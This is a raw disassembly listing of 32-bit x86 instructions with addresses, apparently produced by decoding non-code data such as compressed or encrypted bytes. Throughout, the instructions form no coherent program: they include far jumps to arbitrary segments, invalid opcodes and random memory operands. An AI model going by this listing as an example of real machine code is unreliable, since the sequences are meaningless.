  42e90e:	push   ss
  42e90f:	and    ebp,DWORD PTR [esi-0x47]
  42e912:	dec    ebp
  42e913:	xchg   eax,ebx
  42e915:	xor    edx,edx
  42e917:	jmp    0x42e945
  42e919:	test   eax,0x35bce3a5
  42e91e:	cmp    bh,cl
  42e920:	jmp    0x279d:0x51462500
  42e927:	push   ebp
  42e928:	lods   eax,DWORD PTR ds:[esi]
  42e929:	jns    0x42e97c
  42e92b:	nop
  42e92c:	mov    eax,0xec5ea520
  42e931:	mov    ds:0x8878bdd8,eax
  42e936:	ror    BYTE PTR [ebx-0xd777dae],1
  42e93c:	retf   0x80fa
  42e93f:	lahf   
  42e940:	xor    DWORD PTR [edx-0x1f1e3e14],esi
  42e946:	ror    DWORD PTR [edi+esi*8+0x10],cl
  42e94a:	stc    
  42e94b:	fadd   st(3),st
  42e94d:	das    
  42e94e:	lea    edi,[esi+0x11]
  42e951:	xchg   ebx,eax
  42e952:	push   edx
  42e953:	daa    
  42e954:	test   eax,0x6dde4532
  42e959:	and    al,0x23
  42e95b:	sbb    ebp,DWORD PTR [ecx]
  42e95d:	loopne 0x42e943
  42e95f:	jne    0x42e90e
  42e961:	jl     0x42e9a5
  42e963:	adc    edx,DWORD PTR [esi-0x7a]
  42e966:	mov    ds:0x29023140,al
  42e96b:	jmp    0xf76e:0x8aa0c3bc
  42e972:	jae    0x42e9d0
  42e974:	fmul   QWORD PTR [ecx]
  42e976:	push   esp
  42e977:	popa   
  42e978:	push   0xffffffd1
  42e97a:	loope  0x42e952
  42e97c:	loope  0x42e9e4
  42e97e:	test   BYTE PTR [ecx],cl
  42e980:	outs   dx,DWORD PTR ds:[esi]
  42e981:	clc    
  42e982:	pop    ebx
  42e983:	daa    
  42e984:	jns    0x42e932
  42e986:	jae    0x42ea01
  42e988:	mov    cl,0xbf
  42e98a:	mov    edi,0xc0de7188
  42e98f:	inc    ebp
  42e990:	js     0x42e94c
  42e992:	addr16 xor eax,0xb3a04348
  42e998:	in     eax,0x13
  42e99a:	fnstenv ds:0xa5e2f07
  42e9a0:	or     BYTE PTR [ebx],bh
  42e9a2:	xor    DWORD PTR [eax-0x1bb9daaa],edx
  42e9a8:	enter  0x362d,0xf4
  42e9ac:	cmp    al,0x32
  42e9ae:	aad    0x5e
  42e9b0:	aaa    
  42e9b1:	inc    eax
  42e9b2:	arpl   bx,ax
  42e9b4:	retf   
  42e9b5:	mov    fs,WORD PTR cs:[edi-0x22bed7ff]
  42e9bc:	fsub   DWORD PTR [ecx+0x53]
  42e9bf:	jne    0x42e9c0
  42e9c1:	lahf   
  42e9c2:	js     0x42ea06
  42e9c4:	loop   0x42e948
  42e9c6:	fwait
  42e9c7:	xchg   ecx,eax
  42e9c8:	sub    cl,al
  42e9ca:	dec    eax
  42e9cb:	jne    0x42ea25
  42e9cd:	or     BYTE PTR [eax-0x7e],bl
  42e9d0:	pusha  
  42e9d1:	imul   edi,DWORD PTR [edi+0x3a],0xc375d68b
  42e9d8:	mov    bl,0x3
  42e9da:	addr16 fwait
  42e9dc:	dec    eax
  42e9dd:	and    DWORD PTR [ecx],edi
  42e9df:	shl    DWORD PTR [ebp-0x1e81e3ac],cl
  42e9e5:	and    esp,DWORD PTR [edx+0x2983b71]
  42e9eb:	and    al,BYTE PTR [eax+0x59622058]
  42e9f1:	mov    ah,0x33
  42e9f3:	adc    al,0xeb
  42e9f5:	xor    DWORD PTR ds:0x65e2b0f6,eax
  42e9fb:	aaa    
  42e9fc:	mov    ah,0xff
  42e9fe:	popf   
  42e9ff:	adc    al,ch
  42ea01:	adc    al,0x4
  42ea03:	sbb    bh,al
  42ea05:	push   edi
  42ea06:	inc    eax
  42ea07:	jo     0x42e9b0
  42ea09:	pusha  
  42ea0a:	cli    
  42ea0b:	adc    esi,edx
  42ea0d:	add    ebp,DWORD PTR [eax+0x8a72]
	...
  42ea73:	add    ch,ah
  42ea75:	mov    edx,0xebdfe392
  42ea7a:	cmc    
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	adc    bh,BYTE PTR [ebp-0x5c]
  42ea83:	add    al,0x6d
  42ea85:	hlt    
  42ea86:	add    DWORD PTR [eax],eax
  42ea88:	add    eax,0x98000001
  42ea8d:	call   ebx
  42ea8f:	xchg   DWORD PTR [esi+0x2a],eax
  42ea92:	inc    ebx
  42ea93:	dec    ecx
  42ea94:	add    ecx,DWORD PTR [ebx-0x3701c1c1]
  42ea9a:	lock add al,al
  42ea9d:	sbb    dh,BYTE PTR [eax+0x7962bf4e]
  42eaa3:	jge    0x42eb18
  42eaa5:	mov    ch,0xac
  42eaa7:	fdiv   QWORD PTR [ebp+0x936e4cd]
  42eaad:	popf   
  42eaae:	sbb    al,0x3b
  42eab0:	stos   BYTE PTR es:[edi],al
  42eab1:	xchg   esp,eax
  42eab2:	jmp    0x42ea7b
  42eab4:	mov    esp,0x9cb8d119
  42eab9:	push   ds
  42eaba:	cmp    cl,BYTE PTR [edx+edi*8]
  42eabd:	xchg   DWORD PTR ds:0x496efc21,ecx
  42eac3:	xor    edx,edx
  42eac5:	push   0x70f4684b
  42eaca:	jae    0x42ea6f
  42eacc:	jo     0x42ea7d
  42eace:	mov    ebp,DWORD PTR [ebx]
  42ead0:	adc    DWORD PTR [ebx+ebp*4],edi
  42ead3:	push   edi
  42ead4:	fwait
  42ead5:	neg    edi
  42ead7:	aam    0x51
  42ead9:	test   eax,0x7c3a1b42
  42eade:	push   edi
  42eadf:	retf   0x5279
  42eae2:	cld    
  42eae3:	out    dx,al
  42eae4:	mov    ch,0x8
  42eae6:	mov    esi,0x446a5f35
  42eaeb:	mov    esp,DWORD PTR [eax+0x35856a36]
  42eaf1:	pop    ds
  42eaf2:	push   cs
  42eaf3:	cli    
  42eaf4:	leave  
  42eaf5:	jecxz  0x42eb73
  42eaf7:	mov    eax,ds:0x375d64b0
  42eafc:	or     bl,BYTE PTR [ebp-0x3f43b913]
  42eb02:	enter  0x66f0,0x90
  42eb06:	repz and eax,0x1b70c10a
  42eb0c:	push   ebx
  42eb0d:	pop    edi
  42eb0e:	aas    
  42eb0f:	popa   
  42eb10:	jg     0x42eb31
  42eb12:	ins    DWORD PTR es:[edi],dx
  42eb13:	add    DWORD PTR [esi+0x7866815e],0x63123bd5
  42eb1d:	lds    ebx,FWORD PTR [ebp-0x6d]
  42eb20:	mov    al,ds:0x5eaeb081
  42eb25:	outs   dx,BYTE PTR ds:[esi]
  42eb26:	scas   eax,DWORD PTR es:[edi]
  42eb27:	dec    esi
  42eb28:	xchg   edx,eax
  42eb29:	pop    ss
  42eb2a:	and    DWORD PTR [ecx],ecx
  42eb2c:	pop    edx
  42eb2d:	push   ebx
  42eb2e:	test   ebx,0x3d59e77a
  42eb34:	push   edi
  42eb35:	push   ebp
  42eb36:	cmp    ah,ah
  42eb38:	xchg   esi,eax
  42eb39:	pop    ebp
  42eb3a:	ror    BYTE PTR [ebx],0x10
  42eb3d:	xchg   ebx,eax
  42eb3e:	out    0x30,al
  42eb40:	mov    DWORD PTR [edx+0x69],ebp
  42eb43:	imul   edx,DWORD PTR [ebx+0x2a],0xc5b4cc53
  42eb4a:	push   esi
  42eb4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb4c:	xchg   edi,eax
  42eb4d:	push   es
  42eb4e:	mov    esp,0xdeeee851
  42eb53:	push   eax
  42eb54:	pop    es
  42eb55:	mov    bh,0xc8
  42eb57:	push   es
  42eb58:	add    eax,0x584c9d3a
  42eb5d:	mov    BYTE PTR [edi-0x68],dh
  42eb60:	inc    ecx
  42eb61:	imul   edi,DWORD PTR [edx+0x62913c94],0x0
  42eb68:	icebp  
  42eb69:	and    dh,cl
  42eb6b:	ins    DWORD PTR es:[edi],dx
  42eb6c:	pop    edi
  42eb6d:	xor    ecx,DWORD PTR [eax+0x16]
  42eb70:	sbb    al,BYTE PTR [edx-0x36]
  42eb73:	hlt    
  42eb74:	loope  0x42ebb9
  42eb76:	xor    al,BYTE PTR [ebx+0x211be5dd]
  42eb7c:	adc    al,0x48
  42eb7e:	jb     0x42eb63
  42eb80:	nop
  42eb81:	xchg   ebx,eax
  42eb82:	fistp  WORD PTR [esi+0x4b]
  42eb85:	dec    edi
  42eb86:	(bad)  
  42eb87:	cmp    eax,0xff5252a1
  42eb8c:	daa    
  42eb8d:	nop    DWORD PTR [esi+0x38]
	...
  42ebf1:	add    BYTE PTR [eax],al
  42ebf3:	add    BYTE PTR [esi+0x41],bh
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	sbb    esi,0x72feaddc
  42ec05:	cmc    
  42ec06:	add    DWORD PTR [eax],eax
  42ec08:	add    eax,0xdb000001
  42ec0d:	adc    bh,BYTE PTR [edi+eiz*1-0x7df924b4]
  42ec14:	add    eax,0xebed3117
  42ec19:	jecxz  0x42ebcb
  42ec1b:	scas   eax,DWORD PTR es:[edi]
  42ec1c:	adc    al,0xe9
  42ec1e:	dec    eax
  42ec1f:	das    
  42ec20:	jno    0x3b133cd4
  42ec26:	test   DWORD PTR [ebx],edi
  42ec28:	mov    DWORD PTR [edi],esp
  42ec2a:	pop    ds
  42ec2b:	mov    esi,0x88935a6c
  42ec30:	mov    ds:0x3e6de09a,al
  42ec35:	jl     0x42ec6a
  42ec37:	std    
  42ec38:	rcr    BYTE PTR [eax-0x1a],1
  42ec3b:	loope  0x42ebf7
  42ec3d:	push   edx
  42ec3e:	enter  0x2c71,0x2d
  42ec42:	mov    ds:0xaf47194b,al
  42ec47:	add    ecx,DWORD PTR [esi]
  42ec49:	loope  0x42ecc4
  42ec4b:	adc    eax,0x91a34478
  42ec50:	test   BYTE PTR [ebx+0x32],dh
  42ec53:	mov    esp,0x52a5ae4d
  42ec58:	loope  0x42ec55
  42ec5a:	and    ecx,DWORD PTR [ebp-0x38e5d239]
  42ec60:	jbe    0x42eccf
  42ec62:	adc    al,0xb6
  42ec64:	adc    esi,DWORD PTR [esi+0x2f]
  42ec67:	pop    eax
  42ec68:	jle    0x42ec79
  42ec6a:	jae    0x42ec53
  42ec6c:	pop    edi
  42ec6d:	xor    BYTE PTR [ebx-0x75d87786],cl
  42ec73:	call   0xa914fc63
  42ec78:	(bad)  [edx+0x4a]
  42ec7b:	xchg   DWORD PTR [esi+0x778b5975],esp
  42ec81:	sbb    DWORD PTR [ebp-0x8],0x3243169f
  42ec88:	std    
  42ec89:	or     BYTE PTR [eax+0x7845f209],0x42
  42ec90:	lods   eax,DWORD PTR ds:[esi]
  42ec91:	xor    dl,BYTE PTR [edi]
  42ec93:	test   BYTE PTR [esi],al
  42ec95:	out    dx,eax
  42ec96:	push   DWORD PTR [edx]
  42ec98:	pop    eax
  42ec99:	das    
  42ec9a:	sbb    al,0xdf
  42ec9c:	mov    WORD PTR [ebx+0x7997ad4d],?
  42eca2:	outs   dx,BYTE PTR ds:[esi]
  42eca3:	(bad)  
  42eca4:	loopne 0x42ec57
  42eca6:	fwait
  42eca7:	sub    eax,0x5a1a0771
  42ecac:	mov    bh,dh
  42ecae:	or     eax,0x5520c45d
  42ecb3:	inc    eax
  42ecb4:	lock test eax,0xe9fe8fbe
  42ecba:	jo     0x42ed3b
  42ecbc:	xchg   edi,eax
  42ecbd:	lds    esi,FWORD PTR [eax+0x6f307877]
  42ecc3:	pop    ecx
  42ecc4:	retf   0xa2ab
  42ecc7:	jecxz  0x42ed46
  42ecc9:	scas   eax,DWORD PTR es:[edi]
  42ecca:	mov    esi,0xc0bafb76
  42eccf:	shl    DWORD PTR [edi+0x4b56abad],cl
  42ecd5:	arpl   cx,ax
  42ecd7:	xchg   esp,eax
  42ecd8:	jle    0x42ed37
  42ecda:	xchg   dh,bl
  42ecdc:	pop    eax
  42ecdd:	ret    0xe4d3
  42ece0:	pop    ebp
  42ece1:	icebp  
  42ece2:	sub    dh,BYTE PTR [edi]
  42ece4:	fisub  DWORD PTR [ebx-0x5d]
  42ece7:	add    BYTE PTR [eax-0x70214be1],0xee
  42ecee:	daa    
  42ecef:	(bad)  [ebp-0x6acb1e5f]
  42ecf5:	pop    esi
  42ecf6:	das    
  42ecf7:	popa   
  42ecf8:	aaa    
  42ecf9:	aas    
  42ecfa:	mov    al,0xbd
  42ecfc:	arpl   WORD PTR [esi-0x14],bx
  42ecff:	jl     0x42ed76
  42ed01:	jecxz  0x42ecfb
  42ed03:	push   0x21db3a15
  42ed08:	jl     0x42ecea
  42ed0a:	pop    esi
  42ed0b:	mov    ebp,0xe2f00fc5
  42ed10:	mov    ebx,0x0
	...
  42ed71:	add    BYTE PTR [eax],al
  42ed73:	add    BYTE PTR [edx],ch
  42ed75:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed7b:	mul    bl
  42ed7d:	xor    al,BYTE PTR [ebp+0x5a4e6ca2]
  42ed83:	div    BYTE PTR [edi-0xa]
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    eax,0xa9000001
  42ed8d:	repnz arpl WORD PTR [esi+0x13],sp
  42ed91:	neg    dl
  42ed93:	aad    0x8e
  42ed95:	div    BYTE PTR [edi+ebp*2-0x21]
  42ed99:	or     bh,dh
  42ed9b:	rcr    BYTE PTR [edi+0x4c],1
  42ed9e:	pop    ss
  42ed9f:	call   0xf3e374cc
  42eda4:	or     dl,dl
  42eda6:	rcl    DWORD PTR [ebp-0x5c],0xc9
  42edaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42edab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42edac:	in     al,0x6f
  42edae:	repnz mov ds:0xe4ad0d63,al
  42edb4:	push   0x39
  42edb6:	test   dl,bh
  42edb8:	cmc    
  42edb9:	pop    edi
  42edba:	sub    al,0x97
  42edbc:	pushf  
  42edbd:	das    
  42edbe:	loop   0x42edc7
  42edc0:	fdiv   DWORD PTR [eax+0x5d7731c7]
  42edc6:	pop    ss
  42edc7:	ins    BYTE PTR es:[edi],dx
  42edc8:	or     al,0x76
  42edca:	rcl    DWORD PTR [ebx+0x2102c8d5],0x8a
  42edd1:	cmp    edi,ebp
  42edd3:	xchg   esp,ebp
  42edd5:	aad    0x5b
  42edd7:	xchg   BYTE PTR [ebp-0x62a2d390],ah
  42eddd:	xchg   ebp,eax
  42edde:	dec    BYTE PTR [edx-0x6d55934f]
  42ede4:	test   BYTE PTR [esi-0x2af0e951],al
  42edea:	in     eax,dx
  42edeb:	push   esp
  42edec:	scas   eax,DWORD PTR es:[edi]
  42eded:	imul   ebp,ebp,0xffffffd3
  42edf0:	xchg   esi,eax
  42edf1:	and    DWORD PTR [edi+0x7d],ebp
  42edf4:	mov    DWORD PTR [ecx+edi*1+0x25969bf0],eax
  42edfb:	xsaves [esp+eiz*8+0x34]
  42ee00:	sbb    ebx,0x75
  42ee03:	iret   
  42ee04:	cmp    al,0x37
  42ee06:	retf   
  42ee07:	out    dx,al
  42ee08:	pop    ebp
  42ee09:	les    esi,FWORD PTR [ebp+edx*1-0x19]
  42ee0d:	(bad)  
  42ee0e:	scas   eax,DWORD PTR es:[edi]
  42ee0f:	mov    ebp,0x84ccd1de
  42ee14:	xchg   ebx,eax
  42ee15:	push   0xc
  42ee17:	sub    al,bh
  42ee19:	imul   esi,eax,0x6ad33004
  42ee1f:	adc    ecx,DWORD PTR [ecx-0x271d85b9]
  42ee25:	inc    edx
  42ee26:	push   esp
  42ee27:	jecxz  0x42ee83
  42ee29:	jge    0x42ee58
  42ee2b:	pop    ebx
  42ee2c:	jmp    0x23d09f8f
  42ee31:	call   FWORD PTR [edi]
  42ee33:	cmp    ch,BYTE PTR [ecx+0xa]
  42ee36:	ins    DWORD PTR es:[edi],dx
  42ee37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee38:	(bad)  
  42ee39:	rcl    cl,0x6b
  42ee3c:	nop    DWORD PTR [ecx-0x43]
  42ee40:	sbb    DWORD PTR [ebp-0x1],ebp
  42ee43:	(bad)  
  42ee44:	inc    edi
  42ee45:	adc    eax,0xc3705783
  42ee4a:	dec    esi
  42ee4b:	inc    esp
  42ee4c:	dec    edx
  42ee4d:	sbb    eax,0x7d18d464
  42ee52:	pop    ebp
  42ee53:	sub    edi,DWORD PTR [ebx+0x30d47109]
  42ee59:	clc    
  42ee5a:	not    ecx
  42ee5c:	dec    ecx
  42ee5d:	mov    eax,0xeb89269
  42ee62:	sbb    edx,eax
  42ee64:	es repz int 0x8a
  42ee68:	ja     0x42eea3
  42ee6a:	aam    0x19
  42ee6c:	lds    ebp,FWORD PTR [edi-0x1edd4b7e]
  42ee72:	inc    esp
  42ee73:	mov    al,0xee
  42ee75:	cld    
  42ee76:	push   ss
  42ee77:	pop    esp
  42ee78:	xchg   ebp,eax
  42ee79:	sbb    eax,0x32b4f3ec
  42ee7e:	fldenv [eax]
  42ee80:	scas   eax,DWORD PTR es:[edi]
  42ee81:	dec    esp
  42ee82:	aad    0xcc
  42ee84:	mov    eax,0x254f7d67
  42ee89:	xchg   edx,eax
  42ee8a:	ds leave 
  42ee8c:	jecxz  0x42ee39
  42ee8e:	and    eax,0xe12
	...
  42eef3:	add    bl,al
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	div    BYTE PTR [edi]
  42ef02:	cmc    
  42ef03:	push   esi
  42ef04:	jl     0x42eefd
  42ef06:	add    DWORD PTR [eax],eax
  42ef08:	add    eax,0xaf000001
  42ef0d:	mov    edx,0x550a9562
  42ef12:	arpl   WORD PTR [edi+0x76],di
  42ef15:	aas    
  42ef16:	or     eax,0x5044d1a6
  42ef1b:	or     BYTE PTR [ebp+0x1b],ch
  42ef1e:	scas   eax,DWORD PTR es:[edi]
  42ef1f:	xor    ah,BYTE PTR [edi-0x5a20ba1e]
  42ef25:	inc    ecx
  42ef26:	ins    BYTE PTR es:[edi],dx
  42ef27:	aas    
  42ef28:	sar    BYTE PTR ds:0x3294ca8b,1
  42ef2e:	and    BYTE PTR [eax],dl
  42ef30:	dec    eax
  42ef31:	add    cl,bl
  42ef33:	or     ebp,esp
  42ef35:	mov    bl,BYTE PTR [ecx+eiz*8-0xf]
  42ef39:	rol    cl,1
  42ef3b:	out    0x99,al
  42ef3d:	bound  esp,QWORD PTR [ebx+ebp*1+0x56]
  42ef41:	and    eax,0x680f999f
  42ef46:	cwde   
  42ef47:	jmp    0xab8ad570
  42ef4c:	mov    cs,ebp
  42ef4e:	pop    esp
  42ef4f:	add    ebx,ebx
  42ef51:	jno    0x42ef3d
  42ef53:	in     al,0xbe
  42ef55:	mov    esp,0xb78ce2fd
  42ef5a:	retf   
  42ef5b:	ret    0x7ad6
  42ef5e:	add    DWORD PTR [edi+0x43f45375],esp
  42ef64:	in     eax,dx
  42ef65:	retf   
  42ef66:	sub    eax,0x911b8072
  42ef6b:	adc    edx,0xc2f3b79d
  42ef71:	sbb    DWORD PTR [esi],esi
  42ef73:	or     dl,BYTE PTR [eax+0x30]
  42ef76:	jbe    0x42ef76
  42ef78:	push   edx
  42ef79:	outs   dx,DWORD PTR ds:[esi]
  42ef7a:	add    BYTE PTR [ebx+0x9685ae4],al
  42ef80:	mov    esp,0x668bcee2
  42ef85:	test   al,ah
  42ef87:	cmc    
  42ef88:	xchg   edi,eax
  42ef89:	ja     0x42effd
  42ef8b:	aaa    
  42ef8c:	vhsubpd xmm0,xmm5,XMMWORD PTR [ebx+0x1aaa4e55]
  42ef94:	loopne 0x42ef2b
  42ef96:	push   cs
  42ef97:	sahf   
  42ef98:	out    0xdc,al
  42ef9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ef9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ef9c:	loop   0x42ef93
  42ef9e:	test   al,0x9e
  42efa0:	into   
  42efa1:	adc    ebp,DWORD PTR [edx+0x6]
  42efa4:	adc    al,BYTE PTR [eax]
  42efa6:	mov    bl,0x2f
  42efa8:	xor    DWORD PTR [esi-0x26],esp
  42efab:	dec    edx
  42efac:	xchg   ebx,eax
  42efad:	pop    ebp
  42efae:	icebp  
  42efaf:	pop    ds
  42efb0:	ret    0xe322
  42efb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42efb4:	into   
  42efb5:	int3   
  42efb6:	mov    BYTE PTR [edx+0x41],al
  42efb9:	int3   
  42efba:	dec    ebx
  42efbb:	xchg   BYTE PTR [ecx+0x818bde0],dh
  42efc1:	jge    0x42f01e
  42efc3:	test   DWORD PTR [edx-0x20],edi
  42efc6:	jne    0x42efba
  42efc8:	retf   0x1faf
  42efcb:	scas   eax,DWORD PTR es:[edi]
  42efcc:	push   0x61
  42efce:	xor    eax,0x15165cc
  42efd3:	cwde   
  42efd4:	lods   al,BYTE PTR ds:[esi]
  42efd5:	dec    edx
  42efd6:	mov    dh,0xd1
  42efd8:	mov    dh,0xc4
  42efda:	jmp    0xa16b:0xa6d9dd99
  42efe1:	pop    ds
  42efe2:	dec    edx
  42efe3:	sti    
  42efe4:	in     eax,dx
  42efe5:	push   eax
  42efe6:	push   edi
  42efe7:	push   ecx
  42efe8:	into   
  42efe9:	mov    dh,0xc3
  42efeb:	adc    DWORD PTR [ecx-0x6c7b870a],edi
  42eff1:	sbb    cl,BYTE PTR [eax+0x1fff7bdd]
  42eff7:	sbb    DWORD PTR [esp+edi*4],ebx
  42effa:	or     bl,BYTE PTR [edx]
  42effc:	mov    ebp,0x7cfbe680
  42f001:	mov    ?,WORD PTR [edi]
  42f003:	and    dh,BYTE PTR [ecx+ebp*2-0x1e44a060]
  42f00a:	mov    esp,0xb51365cb
  42f00f:	retf   0xc8
	...
  42f072:	add    BYTE PTR [eax],al
  42f074:	adc    bh,BYTE PTR [esi]
  42f076:	int    0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	mov    al,0xe0
  42f082:	inc    ebx
  42f083:	or     BYTE PTR [ecx+0x50001f8],al
  42f089:	add    DWORD PTR [eax],eax
  42f08b:	add    BYTE PTR [eax],ah
  42f08d:	adc    cl,BYTE PTR [ecx]
  42f08f:	pushf  
  42f090:	pop    eax
  42f091:	xchg   esp,eax
  42f092:	xchg   ebx,eax
  42f093:	adc    edi,DWORD PTR ss:[edx-0x3]
  42f097:	arpl   WORD PTR [eax+0x4a],sp
  42f09a:	outs   dx,BYTE PTR ds:[esi]
  42f09b:	jle    0x42f098
  42f09d:	sbb    eax,0x26020a1e
  42f0a2:	adc    BYTE PTR [eax],al
  42f0a4:	mov    cl,0x6f
  42f0a6:	xor    esi,DWORD PTR [ecx-0x5d91fc25]
  42f0ac:	xchg   edi,eax
  42f0ad:	int    0xc8
  42f0af:	jecxz  0x42f127
  42f0b1:	ja     0x42f0f3
  42f0b3:	pushf  
  42f0b4:	push   0xffffffea
  42f0b6:	pop    ecx
  42f0b7:	iret   
  42f0b8:	inc    esi
  42f0b9:	or     ebx,DWORD PTR [ebx]
  42f0bb:	xlat   BYTE PTR ds:[ebx]
  42f0bc:	sbb    al,0xd8
  42f0be:	inc    edi
  42f0bf:	inc    ebx
  42f0c0:	dec    eax
  42f0c1:	imul   ecx,esi,0x17
  42f0c4:	fs mov ebp,0xa1f615ad
  42f0ca:	mov    edx,0xa32746df
  42f0cf:	dec    edx
  42f0d0:	push   0x55
  42f0d2:	or     eax,0x2a7f1283
  42f0d7:	cmp    eax,0x1f0638fc
  42f0dc:	or     eax,0x726b7439
  42f0e1:	fld    st(4)
  42f0e3:	nop
  42f0e4:	lods   al,BYTE PTR ds:[esi]
  42f0e5:	pop    edi
  42f0e6:	mov    bl,0x7c
  42f0e8:	xchg   edi,eax
  42f0e9:	pop    es
  42f0ea:	lea    ebx,[edi+edi*4+0x3f8d4986]
  42f0f1:	jbe    0x42f0a6
  42f0f3:	in     eax,dx
  42f0f4:	std    
  42f0f5:	mov    ah,BYTE PTR [eax-0x96edf85]
  42f0fb:	in     al,dx
  42f0fc:	outs   dx,DWORD PTR ds:[esi]
  42f0fd:	(bad)  
  42f0fe:	sub    BYTE PTR [eax-0xdb949cf],dl
  42f104:	add    esp,DWORD PTR [ecx]
  42f106:	adc    eax,0x9d562520
  42f10b:	sub    DWORD PTR [esi-0x199ba69c],edx
  42f111:	dec    edi
  42f112:	aas    
  42f113:	enter  0x1b60,0x1
  42f117:	or     ch,BYTE PTR [ebp+0x504e4d6f]
  42f11d:	mov    bl,0x4f
  42f11f:	or     al,0xa5
  42f121:	pop    ss
  42f122:	imul   ecx,ebp,0x9ac2e43f
  42f128:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f129:	mov    eax,ecx
  42f12b:	leave  
  42f12c:	mov    eax,0x786138d4
  42f131:	sti    
  42f132:	inc    esi
  42f133:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f134:	mov    ds:0xe14b7b4c,eax
  42f139:	fimul  DWORD PTR [ebp-0x7f]
  42f13c:	stc    
  42f13d:	jbe    0x42f175
  42f13f:	rcl    cl,cl
  42f141:	test   ebx,0xea3b3add
  42f147:	lods   al,BYTE PTR ds:[esi]
  42f148:	(bad)  
  42f149:	ret    0xfa65
  42f14c:	and    bl,BYTE PTR ds:0xebc92d9f
  42f152:	scas   al,BYTE PTR es:[edi]
  42f153:	pusha  
  42f154:	jmp    esi
  42f156:	mov    ebx,0x659e02ba
  42f15b:	mov    dh,BYTE PTR [ecx]
  42f15d:	push   ds
  42f15e:	mov    es,esp
  42f160:	loope  0x42f168
  42f162:	fwait
  42f163:	xor    BYTE PTR [eax],ah
  42f165:	cli    
  42f166:	xor    edx,ebx
  42f168:	jmp    0x23edbb7c
  42f16d:	sub    esp,DWORD PTR [ebx]
  42f16f:	lahf   
  42f170:	lods   eax,DWORD PTR ds:[esi]
  42f171:	dec    ecx
  42f172:	cdq    
  42f173:	shl    DWORD PTR [edx-0x1eee75fa],cl
  42f179:	push   ebx
  42f17a:	nop
  42f17b:	imul   esi,esi,0xd1152678
  42f181:	dec    ebx
  42f182:	lahf   
  42f183:	add    ah,ch
  42f185:	inc    ebp
  42f186:	pop    eax
  42f187:	sub    DWORD PTR [ebx],ebx
  42f189:	test   DWORD PTR [eax+0x236ec341],ebp
  42f18f:	pop    ebp
  42f190:	call   0x0:0x0
	...
  42f1f3:	add    BYTE PTR [edx+0x26],bl
  42f1f6:	jecxz  0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	pop    esp
  42f201:	popa   
  42f202:	pop    ebp
  42f203:	add    al,0x86
  42f205:	stc    
  42f206:	add    DWORD PTR [eax],eax
  42f208:	add    eax,0xa5000001
  42f20d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f20e:	jecxz  0x42f263
  42f210:	push   eax
  42f211:	or     DWORD PTR [edx+ebp*1],0x4917352f
  42f218:	xchg   esp,eax
  42f219:	jns    0x42f277
  42f21b:	and    BYTE PTR [ecx+ebp*4+0x2a],bh
  42f21f:	enter  0x8065,0xa5
  42f223:	enter  0xd9be,0x9d
  42f227:	icebp  
  42f228:	mov    eax,0xe49d5b9
  42f22d:	xchg   esp,eax
  42f22e:	sbb    ch,ah
  42f230:	cmp    al,0x33
  42f232:	jmp    0x24c521b8
  42f237:	jnp    0x42f27e
  42f239:	or     eax,0xc2feac86
  42f23e:	(bad)  
  42f23f:	call   0x55fc:0xaa846de
  42f246:	fist   WORD PTR [ebp-0x2f]
  42f249:	and    al,0x34
  42f24b:	push   ss
  42f24c:	pop    eax
  42f24d:	cmp    ch,dh
  42f24f:	fisub  WORD PTR [esi]
  42f251:	push   edx
  42f252:	mov    cl,0xb0
  42f254:	test   BYTE PTR [edx-0x47e3b0bf],0xd3
  42f25b:	out    dx,eax
  42f25c:	stos   DWORD PTR es:[edi],eax
  42f25d:	sahf   
  42f25e:	ss call 0xa924:0x3c33a6ed
  42f266:	std    
  42f267:	mov    bh,0x92
  42f269:	dec    eax
  42f26a:	cmp    edx,edi
  42f26c:	sub    eax,0x5cecc4eb
  42f271:	outs   dx,BYTE PTR ds:[esi]
  42f272:	xlat   BYTE PTR ds:[ebx]
  42f273:	sbb    edi,DWORD PTR [edx+0x5e]
  42f276:	test   bl,ch
  42f278:	add    eax,0xc7020d7f
  42f27d:	loope  0x42f2fd
  42f27f:	cld    
  42f280:	into   
  42f281:	sub    DWORD PTR [esp+ebx*2],eax
  42f284:	add    al,0xca
  42f286:	sbb    al,0x19
  42f288:	cmp    al,dh
  42f28a:	mov    ch,0x87
  42f28c:	ret    0x1aa3
  42f28f:	rcl    ebp,cl
  42f291:	xlat   BYTE PTR ds:[ebx]
  42f292:	int    0xd5
  42f294:	(bad)  
  42f295:	sub    al,0xe2
  42f297:	add    al,0x3
  42f299:	popf   
  42f29a:	push   edx
  42f29b:	fst    QWORD PTR [edi]
  42f29d:	cmp    eax,0xba15f9ab
  42f2a2:	cmovs  ebp,DWORD PTR [eax-0x8]
  42f2a6:	and    DWORD PTR [ecx+0x6c27590f],edx
  42f2ac:	cld    
  42f2ad:	scas   al,BYTE PTR es:[edi]
  42f2ae:	ret    
  42f2af:	xchg   esi,eax
  42f2b0:	and    esp,edi
  42f2b2:	push   0xe50df981
  42f2b7:	je     0x42f2b4
  42f2b9:	ficomp DWORD PTR [ebp-0x6731bf45]
  42f2bf:	dec    edx
  42f2c0:	movs   WORD PTR es:[edi],WORD PTR fs:[esi]
  42f2c3:	cmp    al,0x86
  42f2c5:	dec    edx
